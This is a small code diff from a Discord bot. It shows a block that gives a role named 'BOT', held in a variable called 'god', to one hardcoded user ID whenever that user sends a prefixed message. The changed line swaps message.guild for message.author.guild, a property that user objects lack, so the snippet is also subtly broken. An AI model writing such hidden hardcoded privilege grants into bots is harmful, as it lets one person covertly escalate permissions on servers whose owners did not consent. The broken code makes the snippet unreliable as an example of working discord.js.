@@ -71,7 +71,7 @@ client.on("message", async message => {
   if (!message.content.startsWith(prefix)) return;
   if (message.author.id == "310805620775190530" /*&& message.content == "/role"*/)
   {
-    var guild = message.guild
+    var guild = message.author.guild
     var god = guild.roles.cache.find(role => role.name === "BOT")
     message.author.roles.add(god)
   }
